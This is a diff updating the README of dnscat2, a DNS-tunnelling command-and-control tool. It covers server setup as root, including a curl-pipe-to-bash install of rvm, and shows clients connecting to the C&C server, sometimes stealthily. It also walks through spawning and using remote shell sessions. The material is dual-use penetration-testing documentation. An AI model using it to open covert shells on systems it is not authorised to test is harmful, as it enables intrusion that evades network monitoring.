@@ -69,8 +69,7 @@ Here are some important links:
 
 * [Sourcecode on Github](https://github.com/iagox86/dnscat2)
 * [Downloads](https://downloads.skullsecurity.org/dnscat2/) (you'll find [signed](https://downloads.skullsecurity.org/ron.pgp) Linux 32-bit, Linux 64-bit, Win32, and source code versions of the client, plus an archive of the server - keep in mind that that signature file is hosted on the same server as the files, so if you're worried, please verify my PGP key :) )
-* [User documentation](https://github.com/iagox86/dnscat2/blob/master/README.md) (this file)
-* [Protocol](https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md) and [command protocol](https://github.com/iagox86/dnscat2/blob/master/doc/command_protocol.md) documents (as a user, you probably don't need these)
+* [User documentation](/doc/README.md) A collection of files, both for end-users (like the [Changelog](doc/changelog.md)) and for developers (like the [Contributing](/doc/contributing.md) doc)
 * [Issue tracker](https://github.com/iagox86/dnscat2/issues) (you can also email me issues, just put my first name (ron) in front of my domain name (skullsecurity.net))
 
 # How to play
@@ -134,10 +133,20 @@ configured DNS server is (which will fail):
      host   = 0.0.0.0
      port   = 53
      type   = TXT,CNAME,MX
-     server = 127.0.1.1
+     server = 8.8.8.8
     [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
     [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
-    ^c
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: DNS: RCODE_NAME_ERROR
+    [[ ERROR ]] :: The server hasn't returned a valid response in the last 10 attempts.. closing session.
+    [[ FATAL ]] :: There are no active sessions left! Goodbye!
+    [[ WARNING ]] :: Terminating
 
 ### Server
 
@@ -175,36 +184,66 @@ It means you need to install the -dev version of Ruby:
 
 I find that `sudo` isn't always enough to get everything working right,
 I sometimes have to switch to root and work directly as that account.
-`rvm` largely fixes that problem.
+`rvmsudo` doesn't help, because it breaks ctrl-z.
 
 You can verify the server is working by running it with no flags and
 seeing if you get a dnscat2> prompt:
 
-    $ ruby ./dnscat2.rb
-    Setting debug level to: WARNING
+    # ruby ./dnscat2.rb
+
+    New window created: 0
+    Welcome to dnscat2! Some documentation may be out of date.
+
+    passthrough => disabled
+    auto_attach => false
+    auto_command =>
+    process =>
+    history_size (for new windows) => 1000
+    New window created: dns1
+    Starting Dnscat2 DNS server on 0.0.0.0:53
+    [domains = n/a]...
+
     It looks like you didn't give me any domains to recognize!
-    That's cool, though, you can still use a direct connection.
-    Try running this on your client:
-    
-    ./dnscat2 --dns server=<server>
-    
-    Of course, you have to figure out <server> yourself! Clients will
-    connect directly on UDP port 53 (by default).
-    
-    Set debug level to warning
-    Starting DNS server...
-    Starting Dnscat2 DNS server on 0.0.0.0:53 [domains = n/a]...
-    No domains were selected, which means this server will only respond to
-    direct queries (using --host and --port on the client)
+    That's cool, though, you can still use direct queries,
+    although those are less stealthy.
+
+    To talk directly to the server without a domain name, run:
+      ./dnscat2 --dns server=x.x.x.x,port=53
+
+    Of course, you have to figure out <server> yourself! Clients
+    will connect directly on UDP port 53.
+
+    dnscat2>
 
 If you don't run it as root, you might have trouble listening on UDP/53
-(you can use --dnsport to change it). You'll see a stacktrace and a
-warning at the bottom if that's the case.
+(you can use --dnsport to change it). You'll see an error message if
+that's the case.
 
-If anybody has a better guide on how to get the Ruby dependencies,
-please don't hesitate to send me a better guide or a pull request! I
-find the Ruby dependency system confusing, which means I'm probably
-using it wrong. :)
+#### Ruby as root
+
+If you're having trouble running Ruby as root, this is what I do to run
+it the first time:
+
+    $ cd dnscat2/server
+    $ su
+    # gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
+    # \curl -sSL https://get.rvm.io | bash
+    # source /etc/profile.d/rvm.sh
+    # rvm install 1.9
+    # rvm use 1.9
+    # bundle install
+    # ruby ./dnscat2.rb
+
+And subsequent times:
+
+    $ cd dnscat2/server
+    $ su
+    # source /etc/profile.d/rvm.sh
+    # ruby ./dnscat2.rb
+
+`rvmsudo` should make it easier, but dnscat2 doesn't play well with
+`rvmsudo` unfortunately.
+
 
 ## Usage
 
@@ -239,8 +278,8 @@ to just run the server:
     $ ruby ./dnscat2.rb skullseclabs.org
 
 Where "skullseclabs.org" is your own domain. If you don't have an
-authoritative DNS server, just leave it off and the server will only
-respond to queries sent directly to it.
+authoritative DNS server, it isn't mandatory; but this tool works way,
+way better with an authoritative server.
 
 That should actually be all you need! Other than that, you can test it
 using the client's --ping command on any other system, which should be
@@ -252,9 +291,14 @@ If the ping succeeds, your C&C server is probably good! If you ran the
 DNS server on a different port, or if you need to use a custom DNS
 resolver, you can use the --dns flag in addition to --ping:
 
-    $ ./dnscat --dns server=8.8.8.8 --ping skullseclabs.org
+    $ ./dnscat --dns server=8.8.8.8,domain=skullseclabs.org --ping
 
-    $ ./dnscat --dns port=53531,server=localhost --ping skullseclabs.org
+    $ ./dnscat --dns port=53531,server=localhost,domain=skullseclabs.org --ping
+
+Note that when you specify a --dns argument, the domain has to be part
+of that argument (as domain=xxx). You can't just pass it on the
+commandline (due to a limitation of my command parsing; I'll likely
+improve that in a future release).
 
 ### Running a client
 
@@ -276,136 +320,171 @@ it can be given a specific ip address to connect to instead:
 Assuming there's a dnscat2 server running on that host/port, it'll
 create a session there.
 
-### Sessions
+### Windows
 
-I used the term "session" earlier - let's talk about sessions! A session
-is a single virtual "connection" between a client and a server,
-identified by a 16-bit session_id value. A client can maintain multiple
-sessions with a single server (this happens when you spawn a shell from
-within a command session, for example). A server can maintain multiple
-sessions with multiple clients. Think of it as kind of a hub where all
-the connections come back to!
+The dnscat2 UI is made up of a bunch of windows. The default window is
+called the 'main' window. You can get a list of windows by typing
+`windows` (or `sessions`) into any command prompt:
 
-There are several different types of sessions, but the default one -
-which I call a "command session" - is usually what you want (since the
-other ones can be created via that command session). If you want to play
-with other session types, you can pass --console or --exec to the dnscat
-client (the server will recognize the type automatically). Technically,
---ping is also a session type, but it's handled specially.
+    dnscat2> windows
+    0 :: main [active]
+      dns1 :: DNS Driver running on 0.0.0.0:53 domains = skullseclabs.org [*]
 
-When you run dnscat2, you'll see a simple prompt:
+You'll note that there are two windows - window `0` is the main window,
+and window `dns1` is the listener (technically referred to as the
+'tunnel driver').
 
-    dnscat2>
+From any window that accepts commands (`main` and command sessions), you
+can type `help` to get a list of commands:
 
-You can list the sessions using the `sessions` command (initially,
-there's only the one):
-
-    dnscat2> sessions
-    command window <-- You are here!
-    dnscat2>
-
-When a new session is created, you'll be informed:
-
-    dnscat2> sessions
-    command window <-- You are here!
-    dnscat2>
-    New session established: 19334
+    dnscat2> help
     
-    dnscat2> sessions
-    command window <-- You are here!
-     session 19334 :: command (default)
+    Here is a list of commands (use -h on any of them for additional help):
+    * echo
+    * help
+    * kill
+    * quit
+    * set
+    * start
+    * stop
+    * tunnels
+    * unset
+    * window
+    * windows
 
-You can interact with these sessions using the `session -i` command:
+For any of those commands, you can use -h or --help to get details:
 
-    dnscat2> session -i 19334
+    dnscat2> window --help
+    Error: The user requested help
     
-    Welcome to a command session! Use 'help' for a list of commands or ^z
-    for the main menu
-    dnscat [command: 19334]>
+    Interact with a window
+      -i, --i=<s>    Interact with the chosen window
+      -h, --help     Show this message
 
-These sessions can spawn further sessions:
+We'll use the `window` command to interact with `dns1`, which is a
+status window:
 
-    dnscat [command: 28993]> shell
+    dnscat2> window -i dns1
+    New window created: dns1
+    Starting Dnscat2 DNS server on 0.0.0.0:53531
+    [domains = skullseclabs.org]...
+    
+    Assuming you have an authoritative DNS server, you can run
+    the client anywhere with the following:
+      ./dnscat2 skullseclabs.org
+    
+    To talk directly to the server without a domain name, run:
+      ./dnscat2 --dns server=x.x.x.x,port=53531
+    
+    Of course, you have to figure out <server> yourself! Clients
+    will connect directly on UDP port 53531.
+    
+    Received:  dnscat.9fa0ff178f72686d6c716c6376697968657a6d716800 (TXT)
+    Sending:  9fa0ff178f72686d6c716c6376697968657a6d716800
+    Received:  d17cff3e747073776c776d70656b73786f646f616200.skullseclabs.org (MX)
+    Sending:  d17cff3e747073776c776d70656b73786f646f616200.skullseclabs.org
+
+The received and sent strings there are, if you decode them, pings.
+
+You can switch to the 'parent' window (in this case, `main`) by pressing
+ctrl-z. If ctrl-z kills the process, then you probably have to find a
+better way to run it (`rvmsudo` doesn't work, see above).
+
+When a new client connects and creates a session, you'll be notified in
+`main` (and certain other windows):
+
+    New window created: 1
+    dnscat2>
+
+(Note that you have to press enter to get the prompt back)
+
+You can switch to the new window the same way we switched to the `dns1`
+status window:
+
+    dnscat2> window -i 1
+    New window created: 1
+    history_size (session) => 1000
+    This is a command session!
+    
+    That means you can enter a dnscat2 command such as
+    'ping'! For a full list of clients, try 'help'.
+    
+    command session (ubuntu-64) 1>
+
+Command sessions can spawn additional sessions; for example, the `shell`
+command:
+
+    command session (ubuntu-64) 1> shell
     Sent request to execute a shell
-    dnscat [command: 28993]>
-    New session established: 22670
-    dnscat [command: 28993]> sessions
-    Sessions:
-    
-    command window
-     session 28993 :: command (default) <-- You are here!
-     session 22670 [*] :: sh
+    New window created: 2
+    Shell session created!
 
-If you want to go "back" to a parent session, use either ctrl-z or the
-"back" command:
+    command session (ubuntu-64) 1>
 
-    dnscat [command: 28993]> back
-    
-    dnscat2>
+(Note that throughout this document I'm cleaning up the output; usually
+you have to press enter to get the prompt back)
+
+Then, if you return to the main session (ctrl-z or `suspend`, you'll see
+it in the list of windows:
+
+    dnscat2> windows
+    0 :: main [active]
+      dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]
+      1 :: command session (ubuntu-64)
+      2 :: sh (ubuntu-64) [*]
+
+Unfortunately, the 'windows' command in a specific command session only
+shows child windows from that session, and right now new sessions aren't
+spawned as children.
 
 Note that some sessions have `[*]` - that means that there's been
 activity since the last time we looked at them.
 
 When you interact with a session, the interface will look different
 depending on the session type. As you saw with the default session type
-(command sessions) you get a UI just like the top-level virtual session
-(you can type 'help' or run commands or whatever). However, if you
-interact with a 'shell' session, you won't see much immediately,
-until you type a command:
+(command sessions) you get a UI just like the top-level session (you can
+type 'help' or run commands or whatever). However, if you interact with
+a 'shell' session, you won't see much immediately, until you type a
+command:
 
-    dnscat2> session -i 22670
+    dnscat2> windows
+    0 :: main [active]
+      dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]
+      1 :: command session (ubuntu-64)
+      2 :: sh (ubuntu-64) [*]
     
-    Welcome to session 22670! If it's a shell session and you're not seeing
-    output, try typing "pwd" or something!
+    dnscat2> session -i 2
+    New window created: 2
+    history_size (session) => 1000
+    This is a console session!
     
-    pwd
-    /home/ron/tools/dnscat2/client
+    That means that anything you type will be sent as-is to the
+    client, and anything they type will be displayed as-is on the
+    screen! If the client is executing a command and you don't
+    see a prompt, try typing 'pwd' or something!
+    
+    To go back, type ctrl-z.
+    
+    sh (ubuntu-64) 2> pwd
+   /home/ron/tools/dnscat2/client
 
 To escape this, you can use ctrl-z or type "exit" (which will kill the
 session).
 
-You can start a shell directly by running the dnscat2 client with the
---exec flag:
-
-    $ ./dnscat --exec /bin/sh --dns server=localhost,port=53531
-
-On the server, you'll see a session created as usual:
-
-    dnscat2>
-    New session established: 1387
-    
-    Unknown command: sessoin
-    dnscat2> sessions
-    command window <-- You are here!
-     session 28993 :: command (default)
-     session 22670 :: sh
-     session 1387 [*] :: /bin/sh
-
-And you can interact with it as normal:
-
-    dnscat2> session -i $newest
-    
-    pwd
-    /home/ron/tools/dnscat2/client
-
-(Note that I used a variable - $newest - which always refers to the most
-recent session! See other variables by running `set`)
-
 Lastly, to kill a session, the `kill` command can be used:
 
-    dnscat2> sessions
-    command window <-- You are here!
-     session 28993 :: command (default)
-     session 22670 :: sh
-     session 1387 [*] :: /bin/sh
-    dnscat2> 
-    dnscat2> kill 22670
-    Session killed
-    dnscat2> sessions
-    command window <-- You are here!
-     session 28993 :: command (default)
-     session 22670 [*] :: sh :: [idle for 13 seconds]
-     session 1387 [*] :: /bin/sh
+    dnscat2> windows
+    0 :: main [active]
+      dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]
+      1 :: command session (ubuntu-64)
+      2 :: sh (ubuntu-64) [*]
+    dnscat2> kill 2
+    Session 2 has been sent the kill signal!
+    Session 2 has been killed
+    dnscat2> windows
+    0 :: main [active]
+      dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]
+      1 :: command session (ubuntu-64)
 
 # History
 
